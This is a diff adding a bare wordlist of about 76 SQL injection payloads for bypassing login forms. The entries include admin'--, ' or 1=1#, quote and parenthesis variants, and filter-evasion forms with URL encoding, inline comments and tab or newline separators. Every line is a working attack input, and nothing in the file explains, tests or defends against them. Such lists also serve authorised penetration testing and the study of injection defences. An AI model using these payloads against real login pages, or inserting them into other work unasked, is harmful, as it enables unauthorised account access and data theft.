@@ -1,0 +1,76 @@
+admin' #
+admin'-- -
+admin'--
+admin'/*
+admin') #
+admin')-- -
+admin')) #
+admin')) -- -
+' or 1=1#
+' or 1=1-- -
+' or 1=1--
+' or 1=1/*
+' or '1'='1'#
+' or '1'='1'-- -
+' or '1'='1'--
+' or '1'='1
+' or 'x'='x'#
+' or 'x'='x'-- -
+' or 'x'='x
+' or 1-- -
+' or 1#
+') or 1=1#
+') or 1=1-- -
+') or ('1'='1'#
+') or ('1'='1'-- -
+" or 1=1#
+" or 1=1-- -
+" or "1"="1"#
+" or "1"="1"-- -
+" or "x"="x"#
+`or`1`=`1
+' OR 1=1#
+' OR 1=1-- -
+' OR '1'='1'#
+' OR '1'='1'-- -
+'OR 1=1#
+'OR'1'='1
+' or 1=1 limit 1-- -
+' or 1=1 limit 1#
+' or sleep(0)#
+' or sleep(0)-- -
+admin'or'1'='1
+admin' or '1'='1'#
+admin' or '1'='1'-- -
+admin' or 1=1#
+admin' or 1=1-- -
+admin') or '1'='1'#
+admin') or '1'='1'-- -
+admin') or 1=1#
+admin') or 1=1-- -
+' or ''='
+' or ''=''#
+' or ''=''-- -
+'or''='
+1' or '1'='1
+1' or 1=1#
+1' or 1=1-- -
+1 or 1=1-- -
+1 or 1=1#
+' or 2>1#
+' or 2>1-- -
+' or 'unusual'='unusual'#
+' or 'unusual'='unusual'-- -
+' or 1=1;#
+\' or 1=1-- -
+%27 or 1=1-- -
+%27 or 1=1%23
+'/**/or/**/1=1-- -
+'/**/or/**/1=1#
+' or/**/1=1-- -
+'	or	1=1-- -
+' %0aor%0a1=1-- -
+' Or 1=1-- -
+' oR 1=1-- -
+' OR 1=1-- -
+' /*!or*/ 1=1-- -
